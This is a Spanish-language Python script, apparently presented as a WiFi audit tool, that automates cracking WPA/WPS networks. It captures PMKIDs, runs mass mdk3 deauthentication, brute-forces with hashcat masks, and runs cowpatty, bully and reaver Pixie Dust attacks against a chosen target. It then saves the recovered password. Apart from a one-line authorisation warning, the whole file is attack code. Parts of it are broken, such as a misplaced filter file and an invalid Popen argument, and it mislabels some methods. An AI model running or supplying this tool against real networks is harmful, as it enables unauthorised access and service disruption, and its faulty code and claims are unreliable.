#!/usr/bin/env python3
"""
Herramienta Avanzada de Auditoría WiFi - Métodos sin diccionario
Implementa PMKID, ataques avanzados con mdk3, cowpatty y técnicas avanzadas
"""

import os
import sys
import time
import subprocess
import hashlib
import json
import re
from datetime import datetime
import threading
import signal

class AdvancedWiFiAuditor:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.monitor_interface = None
        self.target_bssid = None
        self.target_essid = None
        self.target_channel = None
        self.output_dir = f"wifi_audit_advanced_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Archivos
        self.pmkid_file = None
        self.handshake_file = None
        self.hash_file = None
        
        # Verificar root
        if os.geteuid() != 0:
            print("[!] Se necesitan privilegios de superusuario")
            print("[*] Ejecutar: sudo python3 script.py")
            sys.exit(1)
        
        self.check_dependencies()
    
    def check_dependencies(self):
        """Verificar herramientas necesarias"""
        required = {
            "aircrack-ng": ["airodump-ng", "aireplay-ng", "aircrack-ng"],
            "hcxdumptool": ["hcxdumptool", "hcxpcaptool"],
            "mdk3": ["mdk3"],
            "hashcat": ["hashcat"],
            "cowpatty": ["cowpatty"],
            "bully": ["bully"]
        }
        
        print("[*] Verificando dependencias...")
        missing = []
        
        for category, tools in required.items():
            for tool in tools:
                try:
                    subprocess.run(["which", tool], capture_output=True, check=True)
                    print(f"  [+] {tool} ✓")
                except:
                    missing.append(f"{tool} (de {category})")
        
        if missing:
            print("\n[!] Herramientas faltantes:")
            for tool in missing:
                print(f"  - {tool}")
            print("\n[*] Instalar con:")
            print("    sudo apt-get update")
            print("    sudo apt-get install aircrack-ng mdk3 hashcat bully")
            print("    sudo apt-get install hcxdumptool hcxtools")
            print("    git clone https://github.com/JPaulMora/Pyrit && cd Pyrit && python3 setup.py install")
            sys.exit(1)
    
    def setup_monitor(self):
        """Configurar interfaz en modo monitor"""
        print(f"\n[*] Configurando {self.interface} en modo monitor...")
        
        try:
            # Detener procesos que interfieren
            subprocess.run(["airmon-ng", "check", "kill"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Iniciar modo monitor
            result = subprocess.run(
                ["airmon-ng", "start", self.interface],
                capture_output=True,
                text=True
            )
            
            # Buscar interfaz en modo monitor
            for line in result.stdout.split('\n'):
                if "(monitor mode)" in line:
                    self.monitor_interface = line.split()[0]
                    break
            
            if not self.monitor_interface:
                self.monitor_interface = f"{self.interface}mon"
            
            print(f"[+] Modo monitor activado en: {self.monitor_interface}")
            return True
            
        except Exception as e:
            print(f"[!] Error: {e}")
            return False
    
    def scan_networks_advanced(self):
        """Escaneo avanzado con detección de vulnerabilidades"""
        os.makedirs(self.output_dir, exist_ok=True)
        
        print("\n[*] Iniciando escaneo avanzado...")
        print("[*] Presione Ctrl+C para detener el escaneo")
        
        # Capturar con airodump-ng
        airodump_proc = subprocess.Popen(
            ["airodump-ng", self.monitor_interface, "-w", 
             f"{self.output_dir}/scan", "--output-format", "csv"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(20)
        airodump_proc.terminate()
        
        # Procesar resultados
        networks = []
        try:
            with open(f"{self.output_dir}/scan-01.csv", 'r') as f:
                content = f.read()
            
            # Buscar redes
            ap_section = True
            for line in content.split('\n'):
                if "Station MAC" in line:
                    ap_section = False
                    continue
                
                if ap_section and line.strip():
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        bssid = parts[0]
                        if bssid and len(bssid) == 17:
                            networks.append({
                                'bssid': bssid,
                                'channel': parts[3] if parts[3] else "?",
                                'speed': parts[4] if len(parts) > 4 else "",
                                'privacy': parts[5] if len(parts) > 5 else "",
                                'cipher': parts[6] if len(parts) > 6 else "",
                                'auth': parts[7] if len(parts) > 7 else "",
                                'power': parts[8] if len(parts) > 8 else "?",
                                'beacons': parts[9] if len(parts) > 9 else "",
                                'iv': parts[10] if len(parts) > 10 else "",
                                'essid': parts[13] if len(parts) > 13 else "Hidden"
                            })
        
        except FileNotFoundError:
            print("[!] No se pudo leer archivo de escaneo")
            return []
        
        # Mostrar resultados
        print("\n" + "="*100)
        print(f"{'#':<3} {'BSSID':<18} {'CH':<3} {'PWR':<4} {'ESSID':<20} {'PRIVACY':<12} {'CIPHER':<10} {'AUTH':<10}")
        print("-"*100)
        
        for i, net in enumerate(networks, 1):
            print(f"{i:<3} {net['bssid']:<18} {net['channel']:<3} {net['power']:<4} "
                  f"{net['essid'][:18]:<20} {net['privacy']:<12} {net['cipher']:<10} {net['auth']:<10}")
        
        print("="*100)
        return networks
    
    def capture_pmkid(self):
        """Capturar PMKID usando hcxdumptool (sin necesidad de clientes)"""
        print(f"\n[*] Capturando PMKID para {self.target_bssid}...")
        
        pmkid_output = f"{self.output_dir}/pmkid_capture"
        
        try:
            # Configurar canal
            subprocess.run(["iwconfig", self.monitor_interface, "channel", str(self.target_channel)])
            
            # Iniciar captura PMKID
            print("[*] Iniciando hcxdumptool (Ctrl+C para detener)...")
            
            hcx_proc = subprocess.Popen(
                ["hcxdumptool", "-i", self.monitor_interface, "-o", pmkid_output,
                 "--enable_status=1", "--filterlist=targets.txt", "--filtermode=2"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Crear archivo de targets
            with open(f"{self.output_dir}/targets.txt", "w") as f:
                f.write(self.target_bssid)
            
            # Monitorear salida
            pmkid_found = False
            start_time = time.time()
            
            while time.time() - start_time < 120:  # 2 minutos máximo
                line = hcx_proc.stdout.readline()
                if not line:
                    time.sleep(1)
                    continue
                
                print(f"[HCX] {line.strip()}")
                
                if "PMKID" in line.upper():
                    print("\n[+] PMKID capturado!")
                    pmkid_found = True
                    break
                
                elapsed = int(time.time() - start_time)
                print(f"[*] Tiempo transcurrido: {elapsed}s", end='\r')
            
            hcx_proc.terminate()
            
            if pmkid_found:
                # Convertir a formato hashcat
                print("[*] Convirtiendo a formato hashcat...")
                subprocess.run([
                    "hcxpcaptool", "-z", f"{self.output_dir}/hash.hc22000", pmkid_output
                ], stdout=subprocess.DEVNULL)
                
                self.hash_file = f"{self.output_dir}/hash.hc22000"
                return True
            
        except Exception as e:
            print(f"[!] Error en captura PMKID: {e}")
        
        return False
    
    def capture_handshake_mdk3(self):
        """Capturar handshake usando mdk3 para deauth masivo"""
        print(f"\n[*] Usando mdk3 para deautenticación masiva...")
        
        capture_file = f"{self.output_dir}/mdk3_capture"
        
        try:
            # Iniciar airodump para capturar
            airodump = subprocess.Popen(
                ["airodump-ng", "--bssid", self.target_bssid, "-c", str(self.target_channel),
                 "-w", capture_file, self.monitor_interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(2)  # Esperar que airodump inicie
            
            # Crear archivo de blacklist para mdk3
            with open(f"{self.output_dir}/blacklist.txt", "w") as f:
                f.write(self.target_bssid)
            
            # Ejecutar mdk3 en modo deauth
            print("[*] Ejecutando mdk3 (deauth attack)...")
            mdk3_proc = subprocess.Popen(
                ["mdk3", self.monitor_interface, "d", 
                 "-b", f"{self.output_dir}/blacklist.txt", "-c", str(self.target_channel)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Esperar captura de handshake
            print("[*] Ejecutando deauth por 30 segundos...")
            time.sleep(30)
            
            mdk3_proc.terminate()
            airodump.terminate()
            
            # Verificar handshake
            self.handshake_file = f"{capture_file}-01.cap"
            if self.verify_handshake(self.handshake_file):
                print("[+] Handshake capturado con éxito usando mdk3!")
                return True
            
        except Exception as e:
            print(f"[!] Error con mdk3: {e}")
        
        return False
    
    def verify_handshake(self, cap_file):
        """Verificar si hay handshake en archivo .cap"""
        try:
            result = subprocess.run(
                ["aircrack-ng", cap_file],
                capture_output=True,
                text=True
            )
            return "1 handshake" in result.stdout or "WPA handshake" in result.stdout
        except:
            return False
    
    def attack_pmkid_hashcat(self):
        """Ataque a PMKID usando hashcat con diferentes métodos"""
        if not os.path.exists(self.hash_file):
            print("[!] No hay archivo hash PMKID")
            return None
        
        print("\n" + "="*60)
        print("ATAQUE A PMKID CON HASHCAT - MÉTODOS SIN DICCIONARIO")
        print("="*60)
        
        # Verificar hash
        with open(self.hash_file, 'r') as f:
            hash_content = f.read()
        
        if not hash_content.strip():
            print("[!] Archivo hash vacío")
            return None
        
        print(f"[*] Hash PMKID encontrado: {hash_content[:50]}...")
        
        # Opciones de ataque
        methods = {
            "1": ("Fuerza Bruta (8 caracteres numéricos)", "?d?d?d?d?d?d?d?d"),
            "2": ("Fuerza Bruta (8 letras minúsculas)", "?l?l?l?l?l?l?l?l"),
            "3": ("Fuerza Bruta (8 caracteres alfanuméricos)", "?a?a?a?a?a?a?a?a"),
            "4": ("Patrón común WPA (10 dígitos)", "?d?d?d?d?d?d?d?d?d?d"),
            "5": ("Combinación específica", None)
        }
        
        print("\nSeleccione método de ataque:")
        for key, (desc, _) in methods.items():
            print(f"  {key}. {desc}")
        
        choice = input("\nOpción [1-5]: ").strip()
        
        if choice not in methods:
            print("[!] Opción inválida")
            return None
        
        if choice == "5":
            mask = input("Ingrese máscara (ej: ?l?l?d?d?d?d): ").strip()
        else:
            mask = methods[choice][1]
        
        # Ejecutar hashcat
        print(f"\n[*] Ejecutando hashcat con máscara: {mask}")
        print("[*] Esto puede tomar mucho tiempo...")
        
        try:
            # Mostrar información de GPU
            subprocess.run(["hashcat", "-I"], stdout=subprocess.DEVNULL)
            
            # Ejecutar ataque
            cmd = [
                "hashcat", "-m", "22000", "-a", "3",
                self.hash_file, mask,
                "--force", "-O", "-w", "3"
            ]
            
            print(f"\n[*] Comando: {' '.join(cmd)}")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Mostrar progreso
            password = None
            for line in process.stdout:
                if "Recovered" in line and "1/1" in line:
                    # Extraer password
                    match = re.search(r':([^:]+)$', line)
                    if match:
                        password = match.group(1).strip()
                        print(f"\n[+] CONTRASEÑA ENCONTRADA: {password}")
                        break
                
                if "Status" in line:
                    print(f"\r[*] {line.strip()}", end='')
            
            process.wait()
            
            if not password:
                print("\n[-] No se encontró la contraseña con este método")
            
            return password
            
        except KeyboardInterrupt:
            print("\n[*] Ataque interrumpido")
            return None
        except Exception as e:
            print(f"[!] Error con hashcat: {e}")
            return None
    
    def attack_handshake_cowpatty(self):
        """Ataque usando cowpatty con generación de rainbow tables"""
        if not self.handshake_file or not os.path.exists(self.handshake_file):
            print("[!] No hay archivo de handshake")
            return None
        
        print("\n" + "="*60)
        print("ATAQUE CON COWPATTY - GENERACIÓN DE RAINBOW TABLES")
        print("="*60)
        
        # Generar rainbow table
        print("[*] Generando rainbow table para el ESSID...")
        essid_clean = self.target_essid.replace(" ", "_").replace("/", "_")
        rainbow_file = f"{self.output_dir}/rainbow_{essid_clean}"
        
        try:
            # Usar genpmk para generar rainbow table
            print("[*] Esto puede tomar varios minutos...")
            
            genpmk_proc = subprocess.Popen(
                ["genpmk", "-f", "/usr/share/wordlists/rockyou.txt", 
                 "-d", rainbow_file, "-s", self.target_essid],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Mostrar progreso
            for line in genpmk_proc.stdout:
                if "Processing" in line:
                    print(f"\r[*] {line.strip()}", end='')
            
            genpmk_proc.wait()
            
            # Usar cowpatty con rainbow table
            print(f"\n[*] Usando rainbow table para atacar...")
            cowpatty_proc = subprocess.Popen(
                ["cowpatty", "-d", rainbow_file, "-r", self.handshake_file, 
                 "-s", self.target_essid],
                capture_output=True,
                text=True
            )
            
            output = cowpatty_proc.stdout.read()
            
            if "The PSK is" in output:
                # Extraer password
                lines = output.split('\n')
                for line in lines:
                    if "The PSK is" in line:
                        password = line.split("'")[1]
                        print(f"\n[+] CONTRASEÑA ENCONTRADA: {password}")
                        return password
            
            print("\n[-] No se encontró la contraseña")
            return None
            
        except FileNotFoundError:
            print("[!] genpmk no encontrado, instalando cowpatty completo")
            print("[*] sudo apt-get install cowpatty")
            return None
        except Exception as e:
            print(f"[!] Error con cowpatty: {e}")
            return None
    
    def attack_bully(self):
        """Usar bully para ataque de handshake con fuerza bruta inteligente"""
        print(f"\n[*] Ejecutando bully con ataque por defecto...")
        
        try:
            # Bully necesita interfaz normal, no monitor
            subprocess.run(["airmon-ng", "stop", self.monitor_interface])
            
            # Ejecutar bully
            bully_cmd = [
                "bully", self.interface,
                "-b", self.target_bssid,
                "-e", self.target_essid,
                "-c", str(self.target_channel),
                "-v", "4",
                "-F", f"{self.output_dir}/bully_result"
            ]
            
            print(f"[*] Comando: {' '.join(bully_cmd)}")
            print("[*] Bully intentará diferentes ataques automáticamente...")
            
            process = subprocess.Popen(
                bully_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Monitorear salida
            password = None
            for line in process.stdout:
                print(line.strip())
                if "[+] PIN" in line or "[+] PSK" in line:
                    # Intentar extraer password
                    if "PSK" in line:
                        password = line.split("'")[1]
                        break
            
            process.wait()
            return password
            
        except Exception as e:
            print(f"[!] Error con bully: {e}")
            return None
    
    def attack_wps_pixie(self):
        """Ataque WPS Pixie Dust (si está disponible)"""
        print("\n[*] Probando vulnerabilidad WPS Pixie Dust...")
        
        try:
            # Usar reaver o bully con pixie dust
            pixie_cmd = [
                "reaver", "-i", self.monitor_interface,
                "-b", self.target_bssid,
                "-c", str(self.target_channel),
                "-K", "1",  # Pixie Dust attack
                "-vv"
            ]
            
            print("[*] Ejecutando Reaver WPS Pixie Dust...")
            process = subprocess.Popen(
                pixie_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Esperar resultado
            timeout = 300  # 5 minutos
            start = time.time()
            
            while time.time() - start < timeout:
                line = process.stdout.readline()
                if not line:
                    time.sleep(1)
                    continue
                
                print(f"[REAVER] {line.strip()}")
                
                if "WPS PIN:" in line:
                    pin = line.split(":")[1].strip()
                    print(f"\n[+] WPS PIN encontrado: {pin}")
                    
                    # Obtener PSK del PIN
                    if "WPA PSK:" in line:
                        psk = line.split("WPA PSK:")[1].split()[0].strip().strip("'")
                        print(f"[+] CONTRASEÑA WPA: {psk}")
                        return psk
            
            process.terminate()
            print("[-] No se pudo completar ataque Pixie Dust")
            
        except FileNotFoundError:
            print("[!] reaver no encontrado")
            print("[*] Instalar: sudo apt-get install reaver")
        except Exception as e:
            print(f"[!] Error en ataque WPS: {e}")
        
        return None
    
    def generate_smart_masks(self):
        """Generar máscaras inteligentes basadas en patrones comunes"""
        print("\n[*] Generando máscaras inteligentes...")
        
        masks = []
        
        # Patrones comunes de WiFi
        common_patterns = [
            # Teléfonos (10 dígitos)
            "?d?d?d?d?d?d?d?d?d?d",
            
            # 8 caracteres numéricos
            "?d?d?d?d?d?d?d?d",
            
            # Letras + números (común en routers)
            "?u?l?l?l?l?d?d?d",
            "?l?l?l?l?d?d?d?d",
            
            # Patrones específicos
            "wifi?d?d?d?d",
            "wireless?d?d?d",
            "home?d?d?d?d",
            "admin?d?d?d?d",
            
            # Caracteres especiales comunes
            "?l?l?l?l?d?d?d?d!",
            "?l?l?l?l?d?d?d?d@",
            "?l?l?l?l?d?d?d?d#",
        ]
        
        masks.extend(common_patterns)
        
        # Guardar máscaras
        mask_file = f"{self.output_dir}/smart_masks.txt"
        with open(mask_file, "w") as f:
            for mask in masks:
                f.write(f"{mask}\n")
        
        print(f"[+] {len(masks)} máscaras generadas en {mask_file}")
        return mask_file
    
    def run_comprehensive_attack(self):
        """Ejecutar ataque comprehensivo con múltiples métodos"""
        print("\n" + "="*70)
        print("ATAQUE COMPREHENSIVO - MÚLTIPLES MÉTODOS")
        print("="*70)
        
        results = {}
        
        # Método 1: PMKID con hashcat
        print("\n[FASE 1] Ataque PMKID con hashcat")
        if self.hash_file and os.path.exists(self.hash_file):
            pass_pmkid = self.attack_pmkid_hashcat()
            if pass_pmkid:
                results["PMKID Hashcat"] = pass_pmkid
                return pass_pmkid
        else:
            print("[-] No hay hash PMKID disponible")
        
        # Método 2: Cowpatty con rainbow tables
        print("\n[FASE 2] Ataque con Cowpatty")
        if self.handshake_file and os.path.exists(self.handshake_file):
            pass_cowpatty = self.attack_handshake_cowpatty()
            if pass_cowpatty:
                results["Cowpatty"] = pass_cowpatty
                return pass_cowpatty
        
        # Método 3: Bully
        print("\n[FASE 3] Ataque con Bully")
        pass_bully = self.attack_bully()
        if pass_bully:
            results["Bully"] = pass_bully
            return pass_bully
        
        # Método 4: WPS Pixie Dust
        print("\n[FASE 4] Ataque WPS Pixie Dust")
        pass_wps = self.attack_wps_pixie()
        if pass_wps:
            results["WPS Pixie"] = pass_wps
            return pass_wps
        
        print("\n[-] Ningún método tuvo éxito")
        return None
    
    def cleanup(self):
        """Limpiar y restaurar configuración"""
        print("\n[*] Limpiando...")
        
        if self.monitor_interface:
            subprocess.run(["airmon-ng", "stop", self.monitor_interface],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        subprocess.run(["ifconfig", self.interface, "up"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print("[+] Configuración restaurada")

def main():
    """Función principal"""
    print("="*80)
    print("AUDITORÍA WIFI AVANZADA - MÉTODOS SIN DICCIONARIO")
    print("="*80)
    
    print("\n⚠️  ADVERTENCIA: Solo para redes propias o con autorización escrita")
    
    # Crear auditor
    auditor = AdvancedWiFiAuditor(interface="wlan0")
    
    try:
        # Configurar modo monitor
        if not auditor.setup_monitor():
            return
        
        # Escanear redes
        networks = auditor.scan_networks_advanced()
        
        if not networks:
            print("[!] No se encontraron redes")
            return
        
        # Seleccionar objetivo
        try:
            choice = int(input("\nSeleccione red objetivo (número): "))
            if choice < 1 or choice > len(networks):
                print("[!] Selección inválida")
                return
            
            target = networks[choice-1]
            auditor.target_bssid = target['bssid']
            auditor.target_essid = target['essid']
            auditor.target_channel = target['channel'] if target['channel'] != "?" else "1"
            
            print(f"\n🎯 OBJETIVO SELECCIONADO:")
            print(f"   ESSID: {auditor.target_essid}")
            print(f"   BSSID: {auditor.target_bssid}")
            print(f"   Canal: {auditor.target_channel}")
            
        except ValueError:
            print("[!] Entrada inválida")
            return
        
        # Menú de opciones
        print("\n" + "="*60)
        print("MÉTODOS DE CAPTURA Y ATAQUE:")
        print("="*60)
        print("1. Capturar PMKID (sin clientes, más rápido)")
        print("2. Capturar Handshake con mdk3 (deauth masivo)")
        print("3. Capturar ambos y atacar automáticamente")
        print("4. Solo atacar WPS (si está disponible)")
        print("0. Salir")
        
        option = input("\nSeleccione opción [0-4]: ").strip()
        
        if option == "0":
            return
        
        password = None
        
        if option in ["1", "3"]:
            if auditor.capture_pmkid():
                print("[+] PMKID capturado exitosamente")
        
        if option in ["2", "3"]:
            if auditor.capture_handshake_mdk3():
                print("[+] Handshake capturado exitosamente")
        
        if option == "4":
            password = auditor.attack_wps_pixie()
        else:
            # Menú de ataque
            print("\n" + "="*60)
            print("MÉTODOS DE ATAQUE SIN DICCIONARIO:")
            print("="*60)
            print("1. Ataque PMKID con Hashcat (fuerza bruta)")
            print("2. Cowpatty con rainbow tables")
            print("3. Bully (múltiples vectores)")
            print("4. Ataque comprehensivo (todos los métodos)")
            print("5. Generar máscaras inteligentes")
            
            attack_opt = input("\nSeleccione método de ataque [1-5]: ").strip()
            
            if attack_opt == "1":
                password = auditor.attack_pmkid_hashcat()
            elif attack_opt == "2":
                password = auditor.attack_handshake_cowpatty()
            elif attack_opt == "3":
                password = auditor.attack_bully()
            elif attack_opt == "4":
                password = auditor.run_comprehensive_attack()
            elif attack_opt == "5":
                auditor.generate_smart_masks()
                print("[*] Usar máscaras con: hashcat -m 22000 hash.hc22000 -a 3 masks.txt")
        
        # Mostrar resultados
        if password:
            print("\n" + "="*60)
            print("🎉 CONTRASEÑA ENCONTRADA!")
            print("="*60)
            print(f"Red: {auditor.target_essid}")
            print(f"Contraseña: {password}")
            print("="*60)
            
            # Guardar resultado
            with open(f"{auditor.output_dir}/PASSWORD_FOUND.txt", "w") as f:
                f.write(f"ESSID: {auditor.target_essid}\n")
                f.write(f"BSSID: {auditor.target_bssid}\n")
                f.write(f"Contraseña: {password}\n")
                f.write(f"Fecha: {datetime.now()}\n")
                f.write(f"Método: Ver archivos de log\n")
        
        print(f"\n[*] Archivos guardados en: {auditor.output_dir}")
        
    except KeyboardInterrupt:
        print("\n[*] Interrumpido por usuario")
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        auditor.cleanup()

if __name__ == "__main__":
    main()